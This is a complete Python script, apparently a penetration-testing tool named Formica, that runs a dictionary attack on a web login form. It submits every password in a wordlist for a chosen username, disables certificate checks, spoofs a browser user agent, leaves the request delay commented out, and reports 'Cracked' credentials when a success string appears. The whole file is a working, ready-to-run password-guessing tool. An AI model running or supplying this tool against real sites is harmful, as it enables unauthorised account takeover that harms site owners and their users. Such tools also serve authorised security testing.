#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Formica (Generic Form Bruteforcer)
# Requirements: pip3 install robobrowser 
# Author: @0rbz_

from robobrowser import RoboBrowser
import re,sys,time,argparse,warnings
from random import randint

if not sys.warnoptions:
    warnings.simplefilter("ignore")


print('''
▄████  ████▄ █▄▄▄▄ █▀▄▀█ ▄█ ▄█▄    ██   
█▀   ▀ █   █ █  ▄▀ █ █ █ ██ █▀ ▀▄  █ █  
█▀▀    █   █ █▀▀▌  █ ▄ █ ██ █   ▀  █▄▄█ 
█      ▀████ █  █  █   █ ▐█ █▄  ▄▀ █  █ 
 █             █      █   ▐ ▀███▀     █ 
  ▀           ▀      ▀               █  
                                    ▀            
Author: @0rbz_
''')

def ze_args():
    example = '''\n

Example:

python %s -url http://site/login.php -u admin -w passwords.txt -userinput uname -passinput passwd -s Welcome
''' % (sys.argv[0])

    parser = argparse.ArgumentParser(
        description="Generic Form Bruteforcer",epilog=example,formatter_class=argparse.RawTextHelpFormatter)

    required = parser.add_argument_group('required arguments')
    optional = parser.add_argument_group('optional arguments')

    required.add_argument(
        '-url', help='Target Login URL, i.e., http://site/login.php', required=True)
    required.add_argument(
        '-u', type=str, help='User Name', required=True)
    required.add_argument(
        '-w', type=str, help='Wordlist (Passwords)', required=True)
    optional.add_argument(
        '-ua', type=str, help='User-Agent', required=False, default="Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)")
    required.add_argument(
        '-userinput', type=str, help='User Input Name Form Value', required=True)
    required.add_argument(
        '-passinput', type=str, help='Password Input Name Form Value', required=True)
    required.add_argument(
        '-s', type=str, help='Successful Response Text', required=True)

    args = parser.parse_args()

    url = args.url
    u = args.u
    w = args.w
    ua = args.ua
    userinput = args.userinput
    passinput = args.passinput
    s = args.s
    return url,u,w,ua,userinput,passinput,s

url,u,w,ua,userinput,passinput,s = ze_args()

class color:
    r = '\033[91m'
    g = '\033[92m'
    y = '\033[93m'
    b = '\033[0m'

try:
    pass_list = open(w, 'r').readlines()
    print("[+] Starting dictionary attack on " + color.y + url + color.b)
    print("[+] Using password wordlist " + color.y + w + color.b + " and username " + color.y + u +"." + color.b)
    print("[+] Form Options: Username Input: " + color.y + userinput + color.b + " Password Input: " + color.y + passinput + color.b + " Success Response: " + color.y + s + color.b)

    time.sleep(3)

except:
    print("[!] Can't find " + w +"."+  " Does it exist?")
    sys.exit(1)

def DoTheThing(url,u,userinput,passinput,s,list):
    robot = RoboBrowser(history=False,
    user_agent=str(ua))
    robot.open(str(url), verify=False)
    form = robot.get_form()
    form[userinput].value = u
    form[passinput].value = str.strip(list)

    robot.submit_form(form)

    response = robot.find_all(text = re.compile(s))
    someText = re.search(s, str(response))

    if someText:
        goodNews = someText.groups()
        print(color.g + "[!] Cracked: " + color.b + u + " : " + str.strip(list))
        print("[+] Finished!")
        sys.exit(1)
    else:
        print(color.r + "[*] Trying: " + color.b + u + " : " + str.strip(list))

while True:
    for list in pass_list:
# add some time delay between requests
#        time.sleep(randint(2,5))
        DoTheThing(url,u,userinput,passinput,s,list)
    break
